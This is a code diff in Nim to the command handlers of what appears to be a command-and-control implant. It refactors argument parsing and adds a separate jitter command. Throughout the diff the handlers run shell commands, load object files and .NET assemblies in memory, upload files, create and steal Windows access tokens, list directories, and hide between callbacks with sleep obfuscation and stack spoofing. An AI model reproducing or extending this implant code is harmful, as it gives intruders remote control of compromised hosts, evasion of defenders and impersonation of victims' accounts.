@@ -27,12 +27,9 @@ for cmd in low(CommandType) .. high(CommandType):
 commands[CMD_EXIT] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
         print "   [>] Exiting."
-
-        if task.argCount == 0: 
-            exit()
-        else: 
-            let exitType = parseEnum[ExitType](Bytes.toString(task.args[0].data))
-            exit(exitType)
+        
+        let exitType = parseEnum[ExitType](Bytes.toString(task.args[0].data).toLowerAscii())
+        exit(exitType)
 
     except CatchableError as err:
         return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
@@ -47,23 +44,30 @@ commands[CMD_SELF_DESTRUCT] = proc(ctx: AgentCtx, task: Task): TaskResult =
         
 commands[CMD_SLEEP] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
-        var
-            delay = Bytes.toUint32(task.args[0].data) 
-            jitter = ctx.sleepSettings.jitter
-        
-        print fmt"   [>] Setting sleep delay to {delay} seconds with {jitter}% jitter."
+        let delay = Bytes.toUint32(task.args[0].data) 
 
-        # Optional jitter was passed
-        if int(task.argCount) > 1: 
-            jitter = Bytes.toUint32(task.args[1].data)
-            if jitter < 0 or jitter > 100: 
-                raise newException(CatchableError, protect("Invalid jitter value."))                    
-
-        # Updating sleep in agent context
+        print fmt"   [>] Setting sleep delay to {delay} seconds."
         ctx.sleepSettings.sleepDelay = delay
-        ctx.sleepSettings.jitter = jitter 
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
+        let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
+
+    except CatchableError as err: 
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
+commands[CMD_JITTER] = proc(ctx: AgentCtx, task: Task): TaskResult = 
+    try:
+        let jitter = Bytes.toUint32(task.args[0].data)
+        
+        if jitter < 0 or jitter > 100: 
+            raise newException(CatchableError, protect("Invalid jitter value."))                    
+
+        print fmt"   [>] Setting jitter to {jitter}%."
+        ctx.sleepSettings.jitter = jitter 
+
+        let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
+    
     except CatchableError as err: 
         return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
@@ -71,30 +75,17 @@ commands[CMD_SLEEPMASK] = proc(ctx: AgentCtx, task: Task): TaskResult =
     try: 
         print fmt"   [>] Updating sleepmask settings."
         
-        case int(task.argCount): 
-        of 0: 
-            # Retrieve sleepmask settings 
-            let response = fmt"Sleepmask settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
-
-        of 1: 
-            if task.args[0].argType == cast[uint8](ArgType.BOOL): 
-                let response = fmt"Sleepmask settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
-
-            # Only set the sleepmask technique
-            let technique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
-            ctx.sleepSettings.sleepTechnique = technique
-
-        else: 
-            # Set sleepmask technique and stack-spoofing configuration
-            let technique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
-            ctx.sleepSettings.sleepTechnique = technique
-
-            let spoofStack = cast[bool](task.args[1].data[0]) # BOOLEAN values are just 1 byte
+        let spoofStack = cast[bool](task.args[1].data[0])
+        
+        if spoofStack:
             ctx.sleepSettings.spoofStack = spoofStack
 
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+        if task.args[0].data.len > 0:
+            ctx.sleepSettings.sleepTechnique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
+            ctx.sleepSettings.spoofStack = spoofStack
+
+        let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
 
     except CatchableError as err: 
         return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
@@ -141,20 +132,12 @@ when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
 
     commands[CMD_SHELL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            var 
-                command: string 
-                arguments: string
+            let command = Bytes.toString(task.args[0].data)
+            var arguments = ""
 
-            # Parse arguments 
-            case int(task.argCount): 
-            of 1: # Only the command has been passed as an argument
-                command = Bytes.toString(task.args[0].data)
-                arguments = ""
-            else: # The optional 'arguments' parameter was included
-                command = Bytes.toString(task.args[0].data)
-
-                for arg in task.args[1..^1]: 
-                    arguments &= Bytes.toString(arg.data) & " "
+            for i in 1 ..< task.args.len:
+                if task.args[i].data.len > 0:
+                    arguments &= Bytes.toString(task.args[i].data) & " "
 
             print fmt"   [>] Executing command: {command} {arguments}"
 
@@ -163,7 +146,7 @@ when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
             if output != "":
                 return createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
             else: 
-                return createTaskResult(task, cast[StatusType](status), RESULT_NO_OUTPUT, @[])
+                return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
@@ -173,18 +156,8 @@ when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
 
     commands[CMD_BOF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            var 
-                objectFile: seq[byte] 
-                arguments: seq[byte]
-
-            # Parse arguments 
-            case int(task.argCount): 
-            of 1: # Only the object file has been passed as an argument
-                objectFile = task.args[0].data
-                arguments = @[]
-            else: # Parameters were passed to the BOF execution
-                objectFile = task.args[0].data
-                arguments = string.toBytes(base64.decode(Bytes.toString(task.args[1].data)))
+            let objectFile = task.args[0].data
+            var arguments: seq[byte] = string.toBytes(base64.decode(Bytes.toString(task.args[1].data)))
 
             # Unpacking object file, since it contains the file name too.
             var unpacker = Unpacker.init(Bytes.toString(objectFile))
@@ -208,19 +181,12 @@ when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
 
     commands[CMD_DOTNET] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            var 
-                assembly: seq[byte] 
-                arguments: seq[string]
+            let assembly = task.args[0].data
+            var arguments: seq[string] = @[]
 
-            # Parse arguments 
-            case int(task.argCount): 
-            of 1: # Only the assembly has been passed as an argument
-                assembly = task.args[0].data
-                arguments = @[]
-            else: # Parameters were passed to the BOF execution
-                assembly = task.args[0].data
-                for arg in task.args[1..^1]: 
-                    arguments.add(Bytes.toString(arg.data))
+            for i in 1 ..< task.args.len:
+                if task.args[i].data.len > 0:
+                    arguments.add(Bytes.toString(task.args[i].data))
             
             # Unpacking assembly file, since it contains the file name too.
             var unpacker = Unpacker.init(Bytes.toString(assembly))
@@ -266,7 +232,7 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
 
     commands[CMD_UPLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            var arg: string = Bytes.toString(task.args[0].data) 
+            let arg = Bytes.toString(task.args[0].data) 
 
             # Parse binary argument
             var unpacker = Unpacker.init(arg) 
@@ -274,11 +240,11 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
                 destination = unpacker.getDataWithLengthPrefix() 
                 fileContents = unpacker.getDataWithLengthPrefix() 
 
-            # If a destination has been passed as an argument, upload it there instead
-            if task.argCount == 2: 
+            # If a destination has been passed as an argument, use it instead
+            if task.args[1].data.len > 0: 
                 destination = Bytes.toString(task.args[1].data)
         
-            # Write the file to the current working directory
+            # Write the file to the specified destination
             writeFile(destination, fileContents)
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))
@@ -357,27 +323,27 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
         try: 
             print fmt"   [>] Creating access token from username and password."
             
-            var logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS
-            var  
+            let 
                 username = Bytes.toString(task.args[0].data)
                 password = Bytes.toString(task.args[1].data)
+                logonType: DWORD = cast[DWORD](Bytes.toUint32(task.args[2].data))
         
             # Split username and domain at separator '\'
             let userParts = username.split("\\", 1)
             if userParts.len() != 2: 
                 raise newException(CatchableError, protect("Expected format domain\\username."))
             
-            if task.argCount == 3: 
-                logonType = cast[DWORD](Bytes.toUint32(task.args[2].data))
-            
-            let impersonationUser  = makeToken(userParts[1], password, userParts[0], logonType)
+            var impersonationUser = makeToken(userParts[1], password, userParts[0], logonType)
             if logonType != LOGON32_LOGON_NEW_CREDENTIALS:
-                username = impersonationUser
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))
+                impersonationUser = impersonationUser
+            else:
+                impersonationUser = username
+                
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {impersonationUser}."))
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-        
+
     commands[CMD_STEAL_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             print fmt"   [>] Stealing access token."
@@ -529,9 +495,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
         try:
             var targetDirectory: string
 
-            # Parse arguments
-            case int(task.argCount):
-            of 0: 
+            # Check if directory argument was provided
+            if task.args[0].data.len > 0: 
+                targetDirectory = Bytes.toString(task.args[0].data)
+            else:
                 # Get current working directory using GetCurrentDirectory
                 let 
                     cwdBuffer = newWString(MAX_PATH + 1)
@@ -542,10 +509,11 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
 
                 targetDirectory = $cwdBuffer[0 ..< (int)cwdLength]
 
-            of 1:  
-                targetDirectory = Bytes.toString(task.args[0].data)
-            else:
-                discard
+            # Retrieve absolut path 
+            let pathBuffer = newWString(MAX_PATH + 1)
+            let pathLength = GetFullPathNameW(targetDirectory, MAX_PATH, &pathBuffer, nil)
+            if pathLength > 0:
+                targetDirectory = $pathBuffer[0 ..< (int)pathLength]
 
             print fmt"   [>] Listing files and directories in {targetDirectory}."
                 
